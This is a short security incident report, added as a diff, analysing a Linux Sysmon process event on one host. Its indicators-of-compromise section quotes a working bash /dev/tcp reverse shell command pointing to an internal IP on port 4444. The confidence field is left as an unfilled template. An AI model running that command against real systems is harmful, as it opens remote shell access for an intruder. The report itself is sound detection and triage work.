@@ -1,0 +1,45 @@
+## EXECUTIVE SUMMARY
+A reverse shell attempt was detected on the host ip-10-0-255-92. The activity is unclear as it does not show a successful TCP connection or execution of netcat, but the use of /dev/tcp and command redirection suggests potential malicious intent.
+
+## LOG SOURCE
+Source type: Linux Sysmon, Hosts: ip-10-0-255-92, Time span: 2024-05-31T18:01:42.639983000Z
+
+## SIGNIFICANT SECURITY EVENTS
+- [E001] Linux process event with a reverse shell command pattern
+
+## SUSPICIOUS ACTIVITIES
+- A potential reverse shell attempt was detected, as indicated by the use of /dev/tcp and command redirection. However, no successful TCP connection or execution of netcat is evident in this log data. [E001]
+
+## EVIDENCE REFERENCES
+- [E001] Shows a Linux process event with a reverse shell command pattern
+
+## INCIDENT TIMELINE
+| Timestamp | Event | Source | Host/User | Evidence Ref |
+|-----------|-------|--------|-----------|--------------|
+| 2024-05-31T18:01:42.639983000Z | Linux process event | linux_process_event | ip-10-0-255-92, root | E001 |
+
+## EXTRACTED IOCS
+- Type: Potential command pattern (reverse shell)
+  - Value: "bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53"
+  - External reputation not checked.
+
+## POTENTIAL ATTACK INDICATORS
+- Possible reverse shell attempt using /dev/tcp and command redirection
+- Potential target IP: 10.0.255.12
+- Potential target port: 4444
+
+## CONFIDENCE AND UNCERTAINTY
+Low | Medium | High
+The activity is unclear due to the lack of a successful TCP connection or execution of netcat, but the use of /dev/tcp and command redirection suggests potential malicious intent.
+
+## MISSING INFORMATION
+- Whether a successful TCP connection was established
+- Execution status of the detected reverse shell attempt
+- Additional context about the purpose of this activity
+
+## RECOMMENDED INVESTIGATION STEPS
+1. Investigate further to determine if a successful TCP connection was established.
+2. Check for similar activities or patterns in other logs.
+3. Examine system and network traffic around the time of the event.
+4. Inspect the user account involved in this activity (root).
+5. Consult with incident response team or security analysts for further guidance.
